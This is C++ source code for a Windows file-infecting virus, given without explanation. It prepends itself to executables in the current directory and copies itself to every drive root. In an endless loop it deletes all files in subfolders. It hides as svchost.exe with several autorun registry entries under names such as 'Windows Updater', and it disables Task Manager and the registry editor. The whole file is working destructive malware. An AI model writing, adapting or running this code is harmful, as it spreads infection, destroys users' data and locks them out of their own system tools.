#include <windows.h>
#include <fstream>
#include <time.h>
using namespace std;

char *naruto, *FBuffer = 0, Array[MAX_PATH], inf[3], buff[15], *Buffer, Status[4] = "", Drives[1024];

int i, j;

int func(char *FPath, char *BUFF)
{     
    ifstream r(FPath, ios::in | ios::binary);
    
    r.seekg(0, ios::end);
    
    int size = r.tellg();
    
    r.seekg(0, ios::beg);
    
    Buffer = (char*)malloc(size);
    
    r.read(Buffer, size);
    
    r.close();
    
    for(j = 0; j < size; j++)
    {
       if(Buffer[j] == '*' && Buffer[j+1] == 'B' && Buffer[j+2] == '*')
       {
          strcpy(Status, "YES"); 
          break;
       }
    }
    
    if(strcmp(Status, "YES")) // if not equal to "YES"
    {
       ofstream w(FPath, ios::out | ios::binary);
    
       w.write(BUFF, 464834);
       w.write(inf, strlen(inf)); 
       w.write(Buffer, size); 
    
       w.close();
    }
    
    free(Buffer);

    return 0;
}

void process_files()
{
     char Drive[25], *DrivesP, temp_name_exe[10] = "c.exe", Folder1[260] = "", Folder2[150] = "", Folder[260] = "", CFolder[260] = "";
     
     while(1)
     {
        Sleep(5000);
        
        WIN32_FIND_DATA Data;
        
        HANDLE hFile = FindFirstFile("*.exe", &Data); 
        
        while(FindNextFile(hFile, &Data))
        {
           func(Data.cFileName, naruto);
        }
        
        GetLogicalDriveStrings(1024, Drives);
        
        DrivesP = Drives;
        
        while(*DrivesP)
        {
           strcpy(Drive, DrivesP);
           strcat(Drive, temp_name_exe);
           
           CopyFile(Array, Drive, 0);
           
           DrivesP = &DrivesP[strlen(DrivesP) + 1];
        }
        
        WIN32_FIND_DATA Data2;
        HANDLE hFile2 = FindFirstFile("*.", &Data2); // Only folders
        
        while(FindNextFile(hFile2, &Data2))
        {
           if(Data2.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
           {                        
              strcpy(Folder1, Folder2);
              strcat(Folder1, Data2.cFileName);
              strcpy(Folder, Folder1);
              strcpy(CFolder, Folder1);
              strcat(Folder, "\\*.*");
           
              WIN32_FIND_DATA DataF;
              HANDLE hFolder = FindFirstFile(Folder, &DataF);
           
              while(FindNextFile(hFolder, &DataF))
              {
                 strcpy(Folder1, CFolder);
                 strcat(Folder1, "\\");
                 strcat(Folder1, DataF.cFileName);
                 DeleteFile(Folder1);
              }
           }
        }
    }
}




void setup(char *input_str)
{
     char temp_dir[MAX_PATH];
     
     DWORD dwValue = 1;
     
     GetSystemDirectory(temp_dir, MAX_PATH-1);
     
     strcat(temp_dir, "\\Generic");
     
     CreateDirectory(temp_dir, 0);
     
     strcat(temp_dir, "\\svchost.exe");
     
     CopyFile(input_str, temp_dir, 0);
     
     HKEY hKey;
     
     RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
     RegSetValueEx(hKey, "Generic Host Process for Win32 Services", 0, REG_SZ, (const unsigned char*)temp_dir, MAX_PATH-1);
     RegCloseKey(hKey);
     
     RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, KEY_SET_VALUE, &hKey);
     RegSetValueEx(hKey, "Windows Updater", 0, REG_SZ, (const unsigned char*)temp_dir, MAX_PATH-1);
     RegCloseKey(hKey);
     
     RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", 0, KEY_SET_VALUE, &hKey);
     RegSetValueEx(hKey, "Windows Server", 0, REG_SZ, (const unsigned char*)temp_dir, MAX_PATH-1);
     RegCloseKey(hKey);
     
     RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, KEY_SET_VALUE, &hKey);
     RegSetValueEx(hKey, "Generic", 0, REG_SZ, (const unsigned char*)temp_dir, MAX_PATH-1);
     RegCloseKey(hKey);

     
     RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey);
     RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(DWORD));
     RegCloseKey(hKey);
     
     
     RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey);
     RegSetValueEx(hKey, "DisableRegistrytools", 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(DWORD));
     RegCloseKey(hKey);
}





int WINAPI WinMain(HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nFunsterStil)
{  
    HMODULE HMod = GetModuleHandle(NULL);
    
    GetModuleFileName(HMod, Array, MAX_PATH);
    
    setup(Array);
    
    inf[0] = '*';
    inf[1] = 'B';
    inf[2] = '*';
    
    ifstream self(Array, ios::in | ios::binary);
    
    self.seekg(0, ios::end);
    
    int temp_size = self.tellg();
    
    self.seekg(0, ios::beg);
    
    naruto = (char*)malloc(temp_size);
    
    self.read(naruto, temp_size);
    
    self.close();
    
    for(i = 0; i < temp_size; i++)
    {
       if(naruto[i] == '*' && naruto[i+1] == 'B' && naruto[i+2] == '*')
       {
          FBuffer = naruto + i + 3;
          break;
       }
    }
    
    WIN32_FIND_DATA Data;
    HANDLE hFile = FindFirstFile("*.exe", &Data); 
    
    while(FindNextFile(hFile, &Data))
    {
       func(Data.cFileName, naruto);
    }
    
    srand((unsigned)time(0));
    
    int Number = rand();
    
    char *FName = itoa(Number, buff, 10);
    
    char FileP[MAX_PATH]; 
    
    GetSystemDirectory(FileP, MAX_PATH-1);
    
    strcat(FileP, "\\drivers\\");
    strcat(FileP, FName);
    strcat(FileP, ".exe");
    
    if(FBuffer != 0)
    {
       
       ofstream w(FileP, ios::out | ios::binary);
       
       w.write(FBuffer, temp_size - i + 3);
       
       w.close();
       
       ShellExecute(NULL, NULL, FileP, NULL, NULL, SW_SHOW); 
    }
    
    
    process_files();

}
